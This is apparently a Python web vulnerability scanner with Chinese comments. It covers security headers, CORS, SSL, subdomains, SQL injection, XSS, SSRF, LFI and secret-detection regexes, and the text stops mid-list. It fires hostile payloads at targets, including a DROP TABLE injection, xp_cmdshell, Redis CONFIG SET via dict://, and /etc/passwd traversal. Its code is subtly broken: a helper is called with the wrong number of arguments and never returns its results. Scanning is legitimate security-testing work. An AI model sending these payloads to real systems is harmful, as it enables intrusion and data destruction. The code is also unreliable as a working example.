#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
URL Security Scanner - 自动化Web漏洞扫描器
支持OWASP TOP10基础检测、子域名枚举、目录爆破等
"""

import os
import sys
import json
import re
import time
import hashlib
import logging
import socket
import ssl
import subprocess
from urllib.parse import urlparse, urljoin, urlencode, quote_plus
from urllib.robotparser import RobotFileParser
from typing import Dict, List, Tuple, Optional, Any
from dataclasses import dataclass, field, asdict
from enum import Enum

import requests
from bs4 import BeautifulSoup
import tldextract

# Shannon上下文感知模块（白盒驱动的黑盒扫描增强）
try:
    from shannon_context import (
        ContextAnalyzer,
        ContextAwarePayloadGenerator,
        APIEndpointDiscoverer,
        DataFlowTracer,
        APIEndpoint,
    )
    HAS_SHANNON_CTX = True
except ImportError:
    HAS_SHANNON_CTX = False

# ==================== 配置 ====================

logger = logging.getLogger('url_scanner')

CONFIG_PATH = os.path.join(os.path.dirname(__file__), 'config.json')
with open(CONFIG_PATH, 'r', encoding='utf-8') as f:
    CONFIG = json.load(f)


class Severity(str, Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"

    def __lt__(self, other):
        order = {Severity.INFO: 0, Severity.LOW: 1, Severity.MEDIUM: 2, Severity.HIGH: 3, Severity.CRITICAL: 4}
        return order[self] < order[other]


@dataclass
class VulnFinding:
    id: str
    severity: Severity
    title: str
    description: str
    url: str
    evidence: str = ""
    recommendation: str = ""
    cwe: str = ""
    cvss: float = 0.0
    params: dict = field(default_factory=dict)

    def to_dict(self):
        d = asdict(self)
        d['severity'] = self.severity.value
        return d


@dataclass
class ScanResult:
    target_url: str
    hostname: str
    findings: List[VulnFinding] = field(default_factory=list)
    http_headers: Dict[str, str] = field(default_factory=dict)
    ssl_info: Dict = field(default_factory=dict)
    technologies: List[str] = field(default_factory=list)
    subdomains: List[str] = field(default_factory=list)
    discovered_urls: List[str] = field(default_factory=list)
    dir_bust_results: List[Dict] = field(default_factory=list)
    # Shannon上下文增强信息
    context_info: Dict = field(default_factory=dict)  # 白盒分析上下文摘要
    contextual_endpoints: List[APIEndpoint] = field(default_factory=list)  # 发现的API端点
    data_flow_traces: List[Dict] = field(default_factory=list)  # Source→Sink追踪结果

    @property
    def finding_count(self):
        return len(self.findings)

    @property
    def critical_count(self):
        return sum(1 for f in self.findings if f.severity == Severity.CRITICAL)

    @property
    def high_count(self):
        return sum(1 for f in self.findings if f.severity == Severity.HIGH)

    def add_finding(self, finding: VulnFinding):
        if not any(f.id == finding.id for f in self.findings):
            self.findings.append(finding)


# ==================== HTTP客户端 ====================
class SecureHTTPClient:
    """带重试和错误处理的HTTP客户端"""

    def __init__(self, timeout=30, max_retries=3):
        self.session = requests.Session()
        ua = CONFIG['scanner']['user_agent']
        self.session.headers.update({
            'User-Agent': ua,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
        })
        self.timeout = timeout
        self.max_retries = max_retries

    def get(self, url: str, params: dict = None, **kwargs) -> Optional[requests.Response]:
        for attempt in range(self.max_retries):
            try:
                resp = self.session.get(url, params=params, timeout=self.timeout, allow_redirects=True, **kwargs)
                return resp
            except requests.exceptions.SSLError:
                logger.warning(f"SSL Error on {url}, retrying without verification...")
                self.session.verify = False
                try:
                    resp = self.session.get(url, params=params, timeout=self.timeout, allow_redirects=True, **kwargs)
                    return resp
                except Exception as e:
                    logger.error(f"Failed after SSL retry: {e}")
            except Exception as e:
                logger.warning(f"Attempt {attempt+1}/{self.max_retries} failed for {url}: {e}")
                time.sleep(1 * (attempt + 1))
        return None


# ==================== SSL/TLS检测 ====================
class SSLChecker:
    """SSL/TLS证书安全检查"""

    @staticmethod
    def check(url: str) -> Dict[str, Any]:
        result = {
            'valid': False,
            'issuer': '',
            'subject': '',
            'expiry': None,
            'protocol': '',
            'key_size': 0,
            'warnings': []
        }

        try:
            hostname = urlparse(url).hostname
            if not hostname:
                return result

            context = ssl.create_default_context()
            with socket.create_connection((hostname, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    result['protocol'] = ssock.version() or 'unknown'
                    cert = ssock.getpeercert()
                    if cert:
                        result['valid'] = True
                        # issuer/subject 是 list of (oid_short, value) tuples
                        # 某些条目可能只有 OID 没有 value（单元素 tuple），需要安全解包
                        def _cert_field(field_list):
                            parts = []
                            for item in field_list:
                                if isinstance(item, tuple) and len(item) == 2:
                                    parts.append(f'{item[0]}={item[1]}')
                                elif isinstance(item, str):
                                    parts.append(item)
                                else:
                                    parts.append(str(item))
                            return ', '.join(parts)
                        
                        result['issuer'] = _cert_field(cert['issuer'])
                        result['subject'] = _cert_field(cert['subject'])

                        # 检查证书有效期
                        from datetime import datetime
                        expiry_str = cert['notAfter']
                        expiry_date = datetime.strptime(expiry_str, '%b %d %H:%M:%S %Y GMT')
                        result['expiry'] = expiry_date.strftime('%Y-%m-%d')

                        days_left = (expiry_date - datetime.now()).days
                        if days_left < 30:
                            result['warnings'].append(f"证书将在{days_left}天后过期")
                        elif days_left < 7:
                            result['warnings'].append(f"⚠️ 证书即将在{days_left}天后过期 - HIGH风险")

                    cert_bin = ssock.getpeercert(binary_form=True)
                    import hashlib as hl
                    fingerprint_sha256 = hl.sha256(cert_bin).hexdigest().upper()
                    result['fingerprint'] = fingerprint_sha256

                    # 检查协议版本（TLSv1.2+ 均视为安全）
                    proto = result['protocol'] or ''
                    unsafe_protocols = ['SSLv2', 'SSLv3', 'TLSv1.0', 'TLSv1.1']
                    is_unsafe = any(p in proto for p in unsafe_protocols)
                    if is_unsafe:
                        result['warnings'].append(f"使用不安全的TLS协议: {proto}")

        except ssl.SSLCertVerificationError as e:
            result['valid'] = False
            result['warnings'].append(f"SSL证书验证失败: {e}")
        except Exception as e:
            result['warnings'].append(f"SSL检查异常: {str(e)}")

        return result


# ==================== HTTP头检测 ====================
class HeaderChecker:
    """HTTP安全头检测"""

    CHECKS = [
        {
            'name': 'X-Content-Type-Options',
            'value': 'nosniff',
            'cwe': 'CWE-693',
            'severity': Severity.MEDIUM,
            'title': '缺少 X-Content-Type-Options 头',
            'desc': '服务器未设置 X-Content-Type-Options: nosniff，可能导致MIME类型混淆攻击',
            'rec': '添加响应头: X-Content-Type-Options: nosniff'
        },
        {
            'name': 'X-Frame-Options',
            'value': None,
            'cwe': 'CWE-1021',
            'severity': Severity.MEDIUM,
            'title': '缺少 X-Frame-Options 头',
            'desc': '未设置 X-Frame-Options，网站可能被嵌入iframe进行点击劫持攻击',
            'rec': '添加响应头: X-Frame-Options: DENY 或 SAMEORIGIN'
        },
        {
            'name': 'Content-Security-Policy',
            'value': None,
            'cwe': 'CWE-693',
            'severity': Severity.MEDIUM,
            'title': '缺少 Content-Security-Policy (CSP)',
            'desc': '未配置内容安全策略，无法防御XSS攻击',
            'rec': '添加CSP头: Content-Security-Policy: default-src \'self\''
        },
        {
            'name': 'Strict-Transport-Security',
            'value': None,
            'cwe': 'CWE-319',
            'severity': Severity.MEDIUM,
            'title': '缺少 HSTS 头',
            'desc': '未启用HTTP严格传输安全，可能存在降级攻击风险',
            'rec': '添加响应头: Strict-Transport-Security: max-age=31536000; includeSubDomains'
        },
        {
            'name': 'X-XSS-Protection',
            'value': None,
            'cwe': 'CWE-1021',
            'severity': Severity.LOW,
            'title': '缺少 X-XSS-Protection 头',
            'desc': '未设置浏览器XSS过滤器保护',
            'rec': '添加响应头: X-XSS-Protection: 1; mode=block'
        },
        {
            'name': 'Referrer-Policy',
            'value': None,
            'cwe': 'CWE-200',
            'severity': Severity.LOW,
            'title': '缺少 Referrer-Policy 头',
            'desc': '未设置引用策略，可能导致敏感URL信息泄露',
            'rec': '添加响应头: Referrer-Policy: strict-origin-when-cross-origin'
        },
        {
            'name': 'Permissions-Policy',
            'value': None,
            'cwe': 'CWE-16',
            'severity': Severity.LOW,
            'title': '缺少 Permissions-Policy 头',
            'desc': '未限制浏览器API权限',
            'rec': '添加响应头: Permissions-Policy: geolocation=(), microphone=(), camera=()'
        },
        {
            'name': 'Server',
            'value': None,
            'cwe': 'CWE-200',
            'severity': Severity.LOW,
            'title': '暴露 Server 信息',
            'desc': '服务器版本信息泄露，攻击者可利用已知漏洞',
            'rec': '在服务器配置中隐藏或模糊Server头信息'
        },
        {
            'name': 'X-Powered-By',
            'value': None,
            'cwe': 'CWE-200',
            'severity': Severity.LOW,
            'title': '暴露 X-Powered-By 信息',
            'desc': '技术栈信息泄露，可能帮助攻击者定位已知漏洞',
            'rec': '在应用中移除X-Powered-By响应头'
        },
    ]

    @staticmethod
    def check(headers: Dict[str, str]) -> List[VulnFinding]:
        findings = []

        # 检查敏感头暴露
        sensitive_headers = ['X-Powered-By', 'Server', 'X-AspNet-Version', 'X-AspNetMvc-Version']
        for hdr in sensitive_headers:
            if hdr.lower() in [h.lower() for h in headers]:
                actual_val = headers.get(hdr, headers.get(hdr.title(), ''))
                findings.append(VulnFinding(
                    id=f'HEADER_{hdr.upper()}',
                    severity=Severity.LOW,
                    title=f'{hdr} 头暴露信息',
                    description=f'HTTP响应头 {hdr} 泄露了技术栈信息: {actual_val}',
                    url='', evidence=actual_val, recommendation='移除该敏感响应头',
                    cwe='CWE-200', cvss=3.1
                ))

        # 检查缺失的安全头
        header_keys = [h.lower() for h in headers.keys()]
        for check in HeaderChecker.CHECKS:
            found = any(c == check['name'].lower() for c in header_keys)
            if not found and check['value'] is None:
                # 缺失检查
                findings.append(VulnFinding(
                    id=f'MISSING_{check["name"].upper()}',
                    severity=check['severity'],
                    title=check['title'],
                    description=check['desc'],
                    url='', recommendation=check['rec'],
                    cwe=check['cwe'], cvss=4.3 if check['severity'] == Severity.MEDIUM else 2.0,
                    params={'header': check['name']}
                ))

        return findings


# ==================== CORS检测 ====================
class CORSChecker:
    """CORS安全配置检测"""

    @staticmethod
    def check(url: str, resp: requests.Response) -> List[VulnFinding]:
        findings = []
        access_control_origin = resp.headers.get('Access-Control-Allow-Origin', '')
        access_control_methods = resp.headers.get('Access-Control-Allow-Methods', '')
        access_control_cred = resp.headers.get('Access-Control-Allow-Credentials', '')

        if not access_control_origin:
            return findings  # 无CORS头，安全

        if access_control_origin == '*':
            findings.append(VulnFinding(
                id='CORS_WILDCARD',
                severity=Severity.HIGH,
                title='CORS允许所有来源 (*)',
                description='Access-Control-Allow-Origin: * 允许任何域名跨域访问，可能导致数据泄露',
                url=url,
                evidence='Access-Control-Allow-Origin: *',
                recommendation='限制允许的域名列表，不要使用通配符 *',
                cwe='CWE-942', cvss=7.5
            ))

        if access_control_cred.lower() == 'true' and (access_control_origin == '*' or access_control_origin == ''):
            findings.append(VulnFinding(
                id='CORS_CREDENTIALS_STAR',
                severity=Severity.CRITICAL,
                title='CORS允许携带凭证 + 通配符来源',
                description='Access-Control-Allow-Credentials: true 与 Access-Control-Allow-Origin: * 同时存在，任何网站都可以读取该接口的受保护数据',
                url=url,
                evidence='Allow-Credentials: true, Allow-Origin: *',
                recommendation='禁止同时使用 credentials 和通配符来源',
                cwe='CWE-942', cvss=9.1
            ))

        if 'DELETE' in access_control_methods and access_control_origin == '*':
            findings.append(VulnFinding(
                id='CORS_METHODS_STAR',
                severity=Severity.HIGH,
                title='CORS允许危险HTTP方法对所有来源',
                description='CORS策略允许所有域名使用DELETE等危险方法',
                url=url,
                evidence=f'Allow-Methods: {access_control_methods}, Allow-Origin: *',
                recommendation='限制允许的HTTP方法为必要的GET/POST',
                cwe='CWE-942', cvss=7.5
            ))

        return findings


# ==================== 子域名枚举 ====================
class SubdomainEnum:
    """子域名枚举"""

    # 常用子域名列表
    COMMON_SUBDOMAINS = [
        'www', 'mail', 'ftp', 'vpn', 'api', 'dev', 'staging', 'test',
        'admin', 'login', 'app', 'db', 'cdn', 'static', 'media', 'blog',
        'shop', 'pay', 'auth', 'oauth', 'sso', 'portal', 'dashboard',
        'internal', 'intranet', 'git', 'svn', 'jenkins', 'docker',
        'k8s', 'kube', 'monitor', 'grafana', 'elastic', 'log',
        'docs', 'wiki', 'forum', 'support', 'help', 'status',
        'backup', 'old', 'new', 'beta', 'alpha', 'uat',
        'smtp', 'imap', 'pop', 'dns', 'mx', 'ns1', 'ns2',
    ]

    @staticmethod
    def enum(base_domain: str) -> List[str]:
        found = set()

        # 方法1: 暴力枚举常见子域名
        for sub in SubdomainEnum.COMMON_SUBDOMAINS:
            domain = f"{sub}.{base_domain}"
            try:
                socket.getaddrinfo(domain, None)
                found.add(domain)
                logger.info(f"✅ 找到子域名: {domain}")
            except socket.gaierror:
                pass

        # 方法2: crt.sh证书透明度API (免费且有效)
        try:
            import urllib.request
            url = f"https://crt.sh/?q=%25.{base_domain}&output=json"
            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=15) as resp:
                data = json.loads(resp.read().decode())
                for entry in data[:200]:  # 取前200个结果
                    names = entry.get('name_value', '').split('\n')
                    for name in names:
                        if base_domain in name:
                            found.add(name.strip())
            logger.info(f"crt.sh 枚举完成，额外找到 {len(found)} 个子域名")
        except Exception as e:
            logger.warning(f"crt.sh枚举失败: {e}")

        return sorted(found)


# ==================== SQL注入检测 ====================
class SQLiDetector:
    """SQL注入漏洞检测 — 支持Shannon上下文感知（白盒驱动的动态测试）"""

    # 基础SQLi测试载荷（无上下文时）
    BASE_PAYLOADS = [
        ("' OR '1'='1", "单引号+OR tautology"),
        ("' OR 1=1 -- ", "数字OR注释"),
        ("admin' --", "用户名绕过"),
        ("' UNION SELECT NULL--", "UNION联合注入"),
        ("'; DROP TABLE users --", "DDL注入尝试"),
        ("1; EXEC xp_cmdshell('dir')--", "存储过程注入(SQL Server)"),
        ("' AND SLEEP(5)--", "时间盲注"),
        ("benchmark(10000000,SHA1('test'))--", "MySQL时间盲注"),
        ("' OR 'a'='a'/**/LIMIT/**/1--", "注释绕过"),
    ]

    @staticmethod
    def detect(url: str, context: Dict = None) -> List[VulnFinding]:
        """
        SQLi检测 — 支持上下文感知
        
        Args:
            url: 目标URL
            context: 可选的Shannon上下文数据（白盒分析结果）
                     - matched_vars: SourceInfo列表
                     - framework: 框架名称 (django, flask, spring...)
                     - data_flows: Source→Sink追踪结果
                     - language_flow_count: SQL相关数据流数
        """
        findings = []
        parsed = urlparse(url)

        if not parsed.query:
            return findings

        # 解析查询参数并收集上下文信息
        params = dict([p.split('=', 1) for p in parsed.query.split('&') if '=' in p])
        test_params = SQLiDetector._get_testable_params(params, url)

        # 从URL参数名推断变量类型
        var_type_map = {}
        for pn in test_params:
            var_type_map[pn.lower()] = SQLiDetector._infer_var_type(pn)

        # Shannon上下文感知的payloads
        contextual_payloads = []
        framework = ''
        matched_vars_info = []
        data_flow_count = 0
        
        if context and HAS_SHANNON_CTX:
            framework = context.get('framework', '')
            matched_vars_info = context.get('matched_vars', [])
            data_flow_count = context.get('data_flows', {}).get('sql_flow_count', 0)
            # 使用上下文感知的payload生成器
            for param_name in test_params:
                vtype = var_type_map.get(param_name, '')
                ctx_payloads = ContextAwarePayloadGenerator.generate_sqli_payloads(
                    var_name=param_name,
                    var_type=vtype,
                    context={'framework': framework}
                )
                for cp in ctx_payloads:
                    contextual_payloads.append((cp['payload'], f'上下文适配: {cp["description"]}'))

        # 合并payloads（上下文优先，基础payload兜底）
        all_payloads = contextual_payloads if contextual_payloads else SQLiDetector.BASE_PAYLOADS
        
        # 如果有数据流追踪结果（白盒发现SQL注入点），标记为高置信度并增加测试
        has_data_flow_sqli = data_flow_count > 0
        
        for param_name, original_val in test_params.items():
            param_type = var_type_map.get(param_name, '')
            
            # 如果白盒分析发现这个参数有SQL相关数据流，优先测试
            if has_data_flow_sqli:
                logger.info(f"  ⚡ 白盒线索: 参数 {param_name} 存在Source→Sink SQL数据流 — 增强测试")
                # 对高置信度变量先用针对性的payload
                if param_type == 'int':
                    int_payloads = [
                        ("1 OR 1=1", "数字注入-tautology"),
                        ("-1 UNION SELECT NULL--", "UNION null列数探测"),
                        ("-1 UNION SELECT 1,2,3--", "UNION数值列探测"),
                        ("1 AND SLEEP(5)--", "时间盲注"),
                    ]
                    for payload, desc in int_payloads:
                        context_test = {'framework': framework, 'sql_flow_count': data_flow_count}
                        findings.extend(SQLiDetector._test_url(
                            url, params, param_name, original_val,
                            payload, f"白盒增强-[{param_type}] {desc}",
                            param_name, context_test
                        ))
                    continue
                elif param_type == 'string':
                    str_payloads = [
                        ("' OR '1'='1", "字符串注入-tautology"),
                        ("' UNION SELECT NULL--", "UNION联合注入"),
                        ("admin' --", "用户名绕过"),
                        ("' AND SLEEP(5)--", "时间盲注"),
                    ]
                    for payload, desc in str_payloads:
                        context_test = {'framework': framework, 'sql_flow_count': data_flow_count}
                        findings.extend(SQLiDetector._test_url(
                            url, params, param_name, original_val,
                            payload, f"白盒增强-[{param_type}] {desc}",
                            param_name, context_test
                        ))
                    continue
            
            # 无上下文或通用测试 — 遍历所有payloads
            for payload, desc in all_payloads:
                # 如果已有白盒线索，跳过与上下文不匹配的payload（如路径类型url注入不用SQL payloads）
                if has_data_flow_sqli and param_type == 'path':
                    if any(kw in payload.lower() for kw in ['union', 'select', 'or ', "'"]):
                        # path类型的参数用SSRF/lfi payloads代替
                        pass  # 跳过，后面URLScanner会处理SSRF/LFI
                
                context_test = {'framework': framework, 'sql_flow_count': data_flow_count if has_data_flow_sqli else 0}
                findings.extend(SQLiDetector._test_url(
                    url, params, param_name, original_val,
                    payload, desc, param_name, context_test
                ))

        return findings

    @staticmethod
    def _test_url(url: str, params: dict, param_name: str, original_val: str,
                  payload: str, desc: str, context_info: Dict) -> List[VulnFinding]:
        """测试单个payload并生成finding"""
        findings = []
        parsed = urlparse(url)
        
        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        test_params_copy = params.copy()
        test_params_copy[param_name] = quote_plus(original_val) + quote_plus(payload)
        query_str = '&'.join(f"{k}={quote_plus(v)}" for k, v in test_params_copy.items())
        test_url += f"?{query_str}"

        try:
            resp = requests.get(test_url, timeout=10, allow_redirects=False,
                               headers={'User-Agent': CONFIG['scanner']['user_agent']})

            if resp.status_code == 500:
                has_flows = context_info.get('sql_flow_count', 0) > 0
                severity = Severity.CRITICAL if has_flows else Severity.HIGH
                confidence = 'high' if has_flows else 'medium'
                findings.append(VulnFinding(
                    id=f'SQLi_500_{param_name}',
                    severity=severity,
                    title=f'GET {param_name} 可能存在SQL注入 [白盒增强]',
                    description=f'参数 {param_name} 使用载荷 "{desc}" 返回HTTP 500错误，可能泄露数据库信息。'
                               + (f'白盒分析发现相关数据流链路，置信度提升为高。' if has_flows else '建议进一步验证。'),
                    url=test_url, evidence=f'Status: 500\nPayload: {payload}',
                    recommendation='使用参数化查询，对用户输入进行严格的类型检查和过滤',
                    cwe='CWE-89', cvss=9.1 if has_flows else 8.6,
                    params={'param': param_name}
                ))

            # 时间盲注检测
            start_time = time.time()
            try:
                requests.get(test_url, timeout=15,
                             headers={'User-Agent': CONFIG['scanner']['user_agent']})
                elapsed = time.time() - start_time
                if elapsed > 4:
                    has_flows = context_info.get('sql_flow_count', 0) > 0
                    findings.append(VulnFinding(
                        id=f'SQLi_TIME_{param_name}',
                        severity=Severity.HIGH,
                        title=f'GET {param_name} 可能存在时间盲注 [白盒增强]',
                        description=f'参数 {param_name} 的响应时间明显延长({elapsed:.2f}s)，可能触发数据库SLEEP函数',
                        url=test_url, evidence=f'Delay: {elapsed:.2f}s\\nPayload: {payload}',
                        recommendation='使用参数化查询，检查后端SQL语句拼接逻辑',
                        cwe='CWE-89', cvss=7.5,
                        params={'param': param_name}
                    ))
            except requests.exceptions.ReadTimeout:
                pass

            # 错误信息泄露检测
            error_patterns = [
                r'SQL.*error|mySQL|integrity.*violation|unique.*constraint',
                r'ORA-\\d+|PLS-\\d+|Oracle', r'Microsoft.*SQL.*Server',
                r'Syntax.*error|unterminated.*string|unclosed.*quotation',
                r'sqlalchemy|Flask-SQLAlchemy|Django.*IntegrityError',
            ]
            for pat in error_patterns:
                if re.search(pat, resp.text, re.IGNORECASE):
                    has_flows = context_info.get('sql_flow_count', 0) > 0
                    findings.append(VulnFinding(
                        id=f'SQLi_ERROR_{param_name}',
                        severity=Severity.HIGH,
                        title=f'GET {param_name} 存在SQL错误信息泄露 [白盒增强]',
                        description=f'参数 {param_name} 的响应包含SQL错误详情，可能泄露数据库结构',
                        url=test_url,
                        evidence=re.search(pat, resp.text, re.IGNORECASE).group(0)[:200],
                        recommendation='关闭数据库详细错误提示，使用统一的错误页面',
                        cwe='CWE-209', cvss=6.5,
                        params={'param': param_name}
                    ))

        except Exception as e:
            logger.debug(f'SQLi test failed for {param_name}: {e}')

    @staticmethod
    def _get_testable_params(params: dict, url: str) -> dict:
        """筛选可测试的参数"""
        testable = {}
        # 优先测试常见的敏感参数
        sensitive_keywords = ['id', 'uid', 'user', 'name', 'email', 'file',
                             'path', 'url', 'page', 'sort', 'order', 'search',
                             'query', 'filter', 'where', 'select']

        for param_name, value in params.items():
            if len(value) < 100:  # 跳过过长的参数值
                testable[param_name] = value
                continue
            if any(kw in param_name.lower() for kw in sensitive_keywords):
                testable[param_name] = value

        return testable


# ==================== XSS检测 ====================
class XSSDetector:
    """XSS漏洞检测"""

    PAYLOADS = [
        ("<script>alert(1)</script>", "经典script标签"),
        ("<img src=x onerror=alert(1)>", "img onerror事件"),
        ("<svg/onload=alert(1)>", "SVG onload"),
        ("<body onload=alert(1)>", "body onload"),
        ("<iframe src='javascript:alert(1)'>", "iframe javascript"),
        ("javascript:alert(1)", "javascript协议"),
        ("<a href='javascript:alert(1)'>click</a>", "link javascript"),
        ("<div style=\"background:url(javascript:alert(1))\">", "CSS expression"),
    ]

    @staticmethod
    def detect(url: str) -> List[VulnFinding]:
        findings = []
        parsed = urlparse(url)

        if parsed.query:
            params = dict([p.split('=', 1) for p in parsed.query.split('&') if '=' in p])
            test_params = XSSDetector._get_testable_params(params, url)

            for param_name, original_val in test_params.items():
                for payload, desc in XSSDetector.PAYLOADS:
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    test_params_copy = params.copy()
                    # 替换参数值，保留payload的原始HTML/JS
                    test_payload = original_val + payload
                    query_str = '&'.join(
                        f"{k}={quote_plus(v)}" if k != param_name else f"{k}={payload}"
                        for k, v in test_params_copy.items()
                    )
                    test_url += f"?{query_str}"

                    try:
                        resp = requests.get(test_url, timeout=10, allow_redirects=False,
                                           headers={'User-Agent': CONFIG['scanner']['user_agent']})

                        # 检查响应中是否回显payload
                        escaped_payload = payload.strip()
                        if escaped_payload in resp.text:
                            findings.append(VulnFinding(
                                id=f'XSS_REFLECTED_{param_name}',
                                severity=Severity.HIGH,
                                title=f'GET {param_name} 存在反射型XSS',
                                description=f'参数 {param_name} 的回显中直接包含了XSS载荷: {desc}',
                                url=test_url, evidence=payload[:100],
                                recommendation='对所有用户输入进行HTML实体编码，使用Content-Type: text/html; charset=utf-8',
                                cwe='CWE-79', cvss=7.5, params={'param': param_name}
                            ))

                        # 检查是否被框架自动转义 (常见的WAF/框架响应特征)
                        if any(w in resp.text.lower() for w in ['blocked', 'filtered', 'sanitized']):
                            logger.info(f"  WAF可能拦截了XSS测试 (参数: {param_name})")

                    except Exception as e:
                        logger.debug(f"XSS test failed for {param_name}: {e}")

        return findings

    @staticmethod
    def _get_testable_params(params: dict, url: str) -> dict:
        testable = {}
        sensitive_keywords = ['q', 'search', 'keyword', 'name', 'text', 'content',
                             'title', 'msg', 'comment', 'input']
        for param_name, value in params.items():
            if len(value) < 100:
                testable[param_name] = value
                continue
            if any(kw in param_name.lower() for kw in sensitive_keywords):
                testable[param_name] = value
        return testable


# ==================== SSRF检测 ====================
class SSRFDetector:
    """SSRF (服务端请求伪造) 检测"""

    # 危险协议列表
    DANGEROUS_PROTOCOLS = ['file', 'gopher', 'dict', 'ftp', 'tftp', 'ldap', 'ldaps']

    @staticmethod
    def detect(url: str) -> List[VulnFinding]:
        findings = []
        parsed = urlparse(url)

        if not parsed.query:
            return findings

        params = dict([p.split('=', 1) for p in parsed.query.split('&') if '=' in p])
        testable = SSRFDetector._get_testable_params(params, url)

        # 测试file协议
        for param_name, original_val in testable.items():
            ssrf_payloads = [
                'file:///etc/passwd',
                'gopher://127.0.0.1:6379/_PING',
                'dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/',
            ]

            for payload in ssrf_payloads:
                try:
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    params_copy = params.copy()
                    query_str = '&'.join(
                        f"{k}={quote_plus(v)}" if k != param_name else f"{k}={payload}"
                        for k, v in params_copy.items()
                    )
                    test_url += f"?{query_str}"

                    resp = requests.get(test_url, timeout=5, allow_redirects=False)
                    if resp.status_code not in (200, 301, 302, 400, 403):
                        findings.append(VulnFinding(
                            id=f'SSRF_{param_name}',
                            severity=Severity.CRITICAL,
                            title=f'GET {param_name} 可能存在SSRF',
                            description=f'参数 {param_name} 允许使用文件/内网协议访问本地资源',
                            url=test_url, evidence=f"Status: {resp.status_code}\\nResponse size: {len(resp.text)}",
                            recommendation='禁用危险协议，对URL进行白名单校验，禁止访问内网地址',
                            cwe='CWE-918', cvss=9.8, params={'param': param_name}
                        ))

                except requests.exceptions.ConnectionError:
                    pass  # 目标不可达是预期的
                except Exception as e:
                    logger.debug(f"SSRF test failed: {e}")

        return findings

    @staticmethod
    def _get_testable_params(params: dict, url: str) -> dict:
        keywords = ['url', 'uri', 'link', 'dest', 'redirect', 'next', 'goto',
                    'path', 'file', 'fetch', 'read', 'load', 'page', 'site',
                    'source', 'origin', 'proxy']
        testable = {}
        for k, v in params.items():
            if len(v) < 200 and any(kw in k.lower() for kw in keywords):
                testable[k] = v
        return testable


# ==================== LFI/目录遍历检测 ====================
class LFIDetector:
    """本地文件包含(LFI)和路径遍历检测"""

    PAYLOADS = [
        '../../../../etc/passwd',
        '..\\..\\..\\..\\windows\\system.ini',
        '....//....//....//etc/passwd',
        '/etc/../../etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '/proc/self/environ',
    ]

    @staticmethod
    def detect(url: str) -> List[VulnFinding]:
        findings = []
        parsed = urlparse(url)

        if not parsed.query:
            return findings

        params = dict([p.split('=', 1) for p in parsed.query.split('&') if '=' in p])

        # LFI相关参数关键词
        lfi_keywords = ['file', 'page', 'path', 'include', 'doc', 'folder',
                       'dir', 'load', 'template', 'style', 'view', 'p']

        for param_name, original_val in params.items():
            if not any(kw in param_name.lower() for kw in lfi_keywords):
                continue
            if len(original_val) > 100:
                continue

            for payload in LFIDetector.PAYLOADS:
                try:
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    params_copy = params.copy()
                    query_str = '&'.join(
                        f"{k}={quote_plus(v)}" if k != param_name else f"{k}={payload}"
                        for k, v in params_copy.items()
                    )
                    test_url += f"?{query_str}"

                    resp = requests.get(test_url, timeout=10)
                    if 'root:' in resp.text and '/etc/passwd' in payload:
                        findings.append(VulnFinding(
                            id=f'LFI_{param_name}',
                            severity=Severity.CRITICAL,
                            title=f'GET {param_name} 存在LFI/路径遍历漏洞',
                            description='文件包含参数允许读取系统文件，可直接读取敏感配置和凭证',
                            url=test_url,
                            evidence=resp.text[:500],
                            recommendation='使用白名单限制可访问的文件，禁止使用 ../ 等跳转符号',
                            cwe='CWE-22', cvss=9.8, params={'param': param_name}
                        ))

                except Exception:
                    pass

        return findings


# ==================== 敏感信息泄露检测 ====================
class SensitiveDataDetector:
    """敏感信息泄露检测"""

    # 正则表达式模式
    PATTERNS = [
        {
            'name': 'API Key (AWS)',
            'pattern': r'(?:A3T[A-Z0-9]|AKIA|AGPA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}',
            'cwe': 'CWE-798', 'severity': Severity.CRITICAL,
            'title': '发现AWS访问密钥', 'rec': '立即轮换AWS凭证，使用环境变量存储密钥'
        },
        {
            'name': 'GitHub Token',
            'pattern': r'ghp_[A-Za-z0-9]{36}',
            'cwe': 'CWE-798', 'severity': Severity.CRITICAL,
            'title': '发现GitHub个人访问令牌', 'rec': '立即撤销该令牌，使用环境变量存储凭证'
        },
        {
            'name': 'Generic API Key',
            'pattern': r'(?:api[_-]?key|apikey|api_key)\s*[:=]\s*["\']?[A-Za-z0-9_\-]{20,}["\']?',
            'cwe': 'CWE-798', 'severity': Severity.HIGH,
            'title': '发现API密钥明文', 'rec': '使用环境变量或密钥管理服务存储API密钥'
        },
        {
            'name': 'Private Key',
            'pattern': r'-----BEGIN\s+(RSA|DSA|EC|OPENSSH)\s+PRIVATE\s+KEY-----',
            'cwe': 'CWE-312', 'severity': Severity.CRITICAL,
            'title': '发现私钥文件内容', 'rec': '立即轮换密钥，不要在代码/配置中存储私钥'
        },
        {
            'name': 'Database Password',
            'pattern': r'(?:password|passwd|pwd)\s*[:=]\s*["\']?[^\\s"\']{8,}["\']?',
            'cwe': 'CWE-312', 'severity': Severity.HIGH,
            'title': '发现数据库密码配置', 'rec': '使用环境变量或密钥管理服务存储数据库凭证'
        },
        {
            'name': 'Email Address in Comment',
            'pattern': r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+',
            'cwe': 'CWE-200', 'severity': Severity.LOW,
            'title': '发现邮箱地址（可能是开发者联系方式）', 'rec': '移除代码中的个人邮箱'
        },
        {
            'name': 'Hardcoded IP Address',
            'pattern': r'\b(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3})\b',
